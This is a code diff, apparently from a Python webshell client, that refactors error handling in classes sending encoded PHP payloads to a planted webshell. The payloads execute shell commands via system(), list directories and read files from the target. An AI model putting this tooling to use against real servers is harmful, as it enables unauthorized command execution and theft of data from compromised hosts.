@@ -7,7 +7,8 @@ import base64
 import json
 from dataclasses import dataclass
 from ..utils import random_english_words
-from .base import Session, SessionException
+from .base import Session
+from .exceptions import *
 
 logger = logging.getLogger("sessions.php")
 SUBMIT_WRAPPER_PHP = """\
@@ -34,9 +35,6 @@ class DirectoryEntry:
     entry_type: t.Literal["directory", "file", "unknown"] = "file"
 
 
-class PHPException(SessionException):
-    """PHP代码在运行时产生的错误"""
-
 
 class PHPWebshellMixin:
     def __init__(self, options: t.Union[None, PHPWebshellOptions]):
@@ -52,11 +50,11 @@ class PHPWebshellMixin:
         else:
             raise RuntimeError(f"Unsupported encoder: {self.options.encoder}")
 
-    async def execute_cmd(self, cmd: str) -> t.Union[str, None]:
+    async def execute_cmd(self, cmd: str) -> str:
         """通过system函数执行命令"""
         return await self.submit(f"system({cmd!r});")
 
-    async def list_dir(self, dir_path: str) -> t.Union[t.List[DirectoryEntry], None]:
+    async def list_dir(self, dir_path: str) -> t.List[DirectoryEntry]:
         php_code = """
         error_reporting(0);
         $folderPath = DIR_PATH;
@@ -77,12 +75,10 @@ class PHPWebshellMixin:
             "DIR_PATH", repr(dir_path)
         )
         json_result = await self.submit(php_code)
-        if json_result is None:
-            return None
         try:
             result = json.loads(json_result)
-        except json.JSONDecodeError:
-            return None
+        except json.JSONDecodeError as exc:
+            raise UnexpectedError("JSON解析失败: " + json_result) from exc
         result = [
             DirectoryEntry(
                 name=item["name"],
@@ -93,7 +89,7 @@ class PHPWebshellMixin:
         ]
         return result
 
-    async def get_file_contents(self, filepath: str) -> t.Union[bytes, None]:
+    async def get_file_contents(self, filepath: str) -> bytes:
         php_code = """
         error_reporting(0);
         $filePath = FILE_PATH;
@@ -105,14 +101,14 @@ class PHPWebshellMixin:
         }
         $content = file_get_contents($filePath);
         echo base64_encode($content);
-        """.replace("FILE_PATH", repr(filepath))
+        """.replace(
+            "FILE_PATH", repr(filepath)
+        )
         result = await self.submit(php_code)
-        if result is None:
-            raise PHPException("读取失败")
         if result == "WRONG_NOT_FILE":
-            raise PHPException("目标不是一个文件")
+            raise FileError("目标不是一个文件")
         if result == "WRONG_NO_PERMISSION":
-            raise PHPException("没有权限读取这个文件")
+            raise FileError("没有权限读取这个文件")
         return base64.b64decode(result)
 
     async def get_pwd(self) -> t.Union[str, None]:
@@ -125,8 +121,11 @@ class PHPWebshellMixin:
             "".join(random.choices(string.ascii_lowercase, k=6)),
             "".join(random.choices(string.ascii_lowercase, k=6)),
         )
-        result = await self.submit(f"echo '{first_string}' . '{second_string}';")
-        return result is not None and (first_string + second_string) in result
+        try:
+            result = await self.submit(f"echo '{first_string}' . '{second_string}';")
+        except NetworkError:
+            return False
+        return (first_string + second_string) in result
 
     async def submit(self, payload: str) -> t.Union[str, None]:
         """将payload通过encoder编码后提交"""
@@ -141,29 +140,19 @@ class PHPWebshellMixin:
             payload_raw=payload,
         )
         payload = self.encode(payload)
-        result = await self.submit_raw(payload)
-        if result is None:
-            return None
-        status_code, text = result
+        status_code, text = await self.submit_raw(payload)
         if status_code != 200:
-            logger.warning("status code error: %d", status_code)
-            return None
+            raise UnexpectedError(f"status code error: {status_code}")
         if "POSTEXEC_FAILED" in text:
-            logger.warning("POSTEXEC_FAILED found, payload run failed")
-            return None
+            raise UnexpectedError("POSTEXEC_FAILED found, payload run failed")
         idx_start = text.find(start)
         if idx_start == -1:
-            logger.warning("idx error: start=%d, text=%s", idx_start, repr(text))
-            return None
+            raise UnexpectedError(f"idx error: start={idx_start}, text={repr(text)}")
         idx_stop_r = text[idx_start:].find(stop)
         if idx_stop_r == -1:
-            logger.warning(
-                "idx error: start=%d, stop_r=%d, text=%s",
-                idx_start,
-                idx_stop_r,
-                repr(text),
+            raise UnexpectedError(
+                f"idx error: start={idx_start}, stop_r={idx_stop_r}, text={text!r}"
             )
-            return None
         idx_stop = idx_stop_r + idx_start
         return text[idx_start + len(start) : idx_stop]
 
@@ -221,5 +210,5 @@ class PHPWebshellOneliner(PHPWebshellMixin, Session):
                 )
                 return response.status_code, response.text
 
-        except httpx.HTTPError:
-            return None
+        except httpx.HTTPError as exc:
+            raise NetworkError("发送HTTP请求失败") from exc
